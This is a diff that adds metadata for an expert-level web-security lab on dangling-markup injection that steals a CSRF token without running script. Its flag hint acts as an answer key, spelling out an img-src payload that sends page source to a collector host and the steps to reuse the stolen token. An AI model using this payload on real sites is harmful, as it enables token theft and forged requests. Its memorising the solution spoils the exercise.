@@ -1,0 +1,47 @@
+{
+  "$schema": "../../../labctl/src/schemas/meta.schema.json",
+  "schema_version": "1.0.0",
+  "id": "dangling-markup-csrf-token-exfil",
+  "title": "Dangling Markup — Stealing a CSRF Token Without Executing JS",
+  "track": "xss",
+  "difficulty": "expert",
+  "estimated_minutes": 50,
+  "max_lifetime_minutes": 60,
+  "learning_objectives": [
+    "Understand dangling-markup injection: an unterminated tag/attribute (a resource URL left open) swallows the following page source into a request the browser sends — a scriptless exfiltration primitive",
+    "Recognise that a strict CSP (script-src 'none') stops <script>/onerror but NOT a dangling <img src>, because loading an image is not script execution (img-src governs it, not script-src)",
+    "Exploit a raw reflection into an UNQUOTED attribute (URL context): x><img src='http://collector/?d= leaves a single-quoted src open that captures the DOM up to the next quote, including a hidden CSRF token",
+    "Know the modern constraint: Chrome's dangling-markup mitigation blocks a resource URL formed across a NEWLINE, so the capture only works when the token sits on the same source line (verified live in Chromium 131)",
+    "Apply the fixes: contextually encode reflected values (never raw into an unquoted attribute), always quote attributes, keep secrets off pages that reflect untrusted input, and add a CSP that would still block this (e.g. restrictive img-src / connect-src)"
+  ],
+  "owasp_categories": ["A03:2021-Injection"],
+  "cwe_ids": ["CWE-79", "CWE-201"],
+  "prerequisites": ["css-injection-attr-selector-token-exfil"],
+  "flag_hint": "The staff /page?u= reflects u RAW into an UNQUOTED attribute on a single line, under CSP script-src 'none', with a hidden CSRF token further along the line. Queue POST /report {\"url\":\"/page?u=x><img src='http://collector:9000/leak?d=\"} — the dangling single-quoted src swallows the line (incl. value=<token>) to the collector. Read /oob/received, extract value=<16hex>, POST /admin/action {\"csrf\":\"<token>\"}, then POST /solve.",
+  "tech_stack": [
+    "Python 3.12",
+    "Flask 3.1",
+    "gunicorn 23",
+    "raw reflection into an UNQUOTED attribute on a single-line template + CSP script-src 'none'",
+    "hidden CSRF token in an <input value> (captured as source text by the dangling markup)",
+    "@websec-lab/xss-verifier headless-Chromium bot",
+    "stdlib OOB collector"
+  ],
+  "tags": [
+    "xss",
+    "dangling-markup",
+    "scriptless",
+    "csrf-token-theft",
+    "data-exfiltration",
+    "unquoted-attribute",
+    "csp-script-src-none",
+    "oob-exfil",
+    "victim-bot",
+    "cwe-79",
+    "cwe-201"
+  ],
+  "risk": "low",
+  "authors": ["furkanalp41"],
+  "exposed_service": { "container_port": 8080, "protocol": "http", "http_path": "/" },
+  "inspired_by": "The dangling-markup / trailing-markup injection technique (Michal Zalewski / Gareth Heyes / PortSwigger dangling-markup research) for scriptless data theft under a script-blocking CSP, abstracted for local Docker with a Flask reflect-into-unquoted-attribute page, a Playwright admin bot, and an OOB collector"
+}
